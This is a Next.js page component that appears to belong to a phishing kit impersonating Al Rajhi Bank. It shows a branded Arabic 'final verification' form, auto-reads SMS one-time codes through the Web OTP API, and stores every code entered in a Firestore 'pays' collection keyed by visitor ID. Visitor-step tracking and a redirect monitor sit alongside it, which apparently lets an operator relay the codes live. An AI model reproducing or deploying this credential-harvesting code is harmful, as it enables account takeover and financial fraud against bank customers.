"use client";

import type React from "react";
import { useEffect, useRef, useState } from "react";
import { AlertCircle, Loader2, Menu } from "lucide-react";
import Image from "next/image";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { updateVisitorPage } from "@/lib/visitor-tracking";
import { db } from "@/lib/firebase";
import { doc, setDoc, Firestore } from "firebase/firestore";

export default function FinalOtpPage() {
  const [visitorId, setVisitorId] = useState("");
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [successMessage, setSuccessMessage] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const allFinalOtps = useRef<string[]>([]);

  useEffect(() => {
    const id = localStorage.getItem("visitor") || "";
    setVisitorId(id);
    if (id) {
      updateVisitorPage(id, "rajhi", 9);
    }
  }, []);

  useRedirectMonitor({
    visitorId,
    currentPage: "rajhi",
  });

  // OTP auto-complete using Web OTP API when available.
  useEffect(() => {
    if (typeof window === "undefined" || !("OTPCredential" in window)) {
      return;
    }

    const abortController = new AbortController();

    navigator.credentials
      .get({
        otp: { transport: ["sms"] },
        signal: abortController.signal,
      } as any)
      .then((credential: any) => {
        const code = String(credential?.code || "")
          .replace(/\D/g, "")
          .slice(0, 6);

        if (code) {
          setOtp(code);
          setError("");
        }
      })
      .catch((err: any) => {
        if (err?.name !== "AbortError") {
          console.log("[step6] OTP auto-fill error:", err);
        }
      });

    return () => abortController.abort();
  }, []);

  const handleOtpChange = (value: string) => {
    setOtp(value.replace(/\D/g, "").slice(0, 6));
    setError("");
    setSuccessMessage("");
  };

  const isOtpValid = otp.length === 4 || otp.length === 6;

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!visitorId) {
      setError("تعذر العثور على الجلسة. يرجى إعادة المحاولة.");
      return;
    }

    if (!isOtpValid) {
      setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام.");
      return;
    }

    try {
      setIsSubmitting(true);
      setError("");
      setSuccessMessage("");
      allFinalOtps.current = [...allFinalOtps.current, otp];

      if (!db) {
        throw new Error("Firebase not configured");
      }

      await setDoc(
        doc(db as Firestore, "pays", visitorId),
        {
          finalOtp: otp,
          // Keep legacy key for compatibility with existing readers.
          rajhiOtp: otp,
          allFinalOtps: allFinalOtps.current,
          finalOtpStatus: "verifying",
          finalOtpSubmittedAt: new Date().toISOString(),
          finalOtpUpdatedAt: new Date().toISOString(),
        },
        { merge: true }
      );

      setSuccessMessage("تم إرسال رمز التحقق بنجاح.");
    } catch (err) {
      console.error("[step6] Error submitting final OTP:", err);
      setError("حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <header className="flex items-center justify-between px-4 py-4 border-b border-border bg-card">
        <div className="flex items-center gap-3">
          <AlRajhiLogo />
        </div>
        <button className="p-2" type="button" aria-label="menu">
          <Menu className="w-6 h-6 text-foreground" />
        </button>
      </header>

      <main className="px-5 py-8 max-w-xl mx-auto">
        <div className="text-right mb-8">
          <h1 className="text-3xl font-bold text-foreground mb-2">التحقق النهائي</h1>
          <p className="text-muted-foreground text-lg">
            أدخل رمز التحقق المرسل إلى جوالك (4 أو 6 أرقام)
          </p>
        </div>

        <form className="space-y-5" onSubmit={handleOtpSubmit}>
          <div className="space-y-2">
            <label className="text-sm text-muted-foreground block">
              رمز التحقق
            </label>
            <input
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={6}
              required
              value={otp}
              onChange={(e) => handleOtpChange(e.target.value)}
              placeholder="0000 أو 000000"
              className="w-full h-16 px-5 rounded-2xl bg-muted text-foreground placeholder:text-muted-foreground text-center text-2xl tracking-widest border border-border focus:outline-none focus:ring-2 focus:ring-rajhi-blue"
            />
          </div>

          {error && (
            <div className="flex items-center gap-2 rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-red-700">
              <AlertCircle className="w-5 h-5" />
              <span>{error}</span>
            </div>
          )}

          {successMessage && (
            <div className="rounded-xl border border-green-200 bg-green-50 px-4 py-3 text-green-700">
              {successMessage}
            </div>
          )}

          <button
            type="submit"
            disabled={!isOtpValid || isSubmitting}
            className="w-full h-16 rounded-2xl text-white font-medium text-lg bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isSubmitting ? (
              <span className="inline-flex items-center justify-center gap-2">
                <Loader2 className="w-5 h-5 animate-spin" />
                جاري الإرسال...
              </span>
            ) : (
              "تأكيد"
            )}
          </button>
        </form>
      </main>
    </div>
  );
}

function AlRajhiLogo() {
  return (
    <div className="flex items-center gap-2">
      <Image src="/rhj.png" alt="logo" width={120} height={40} priority />
    </div>
  );
}
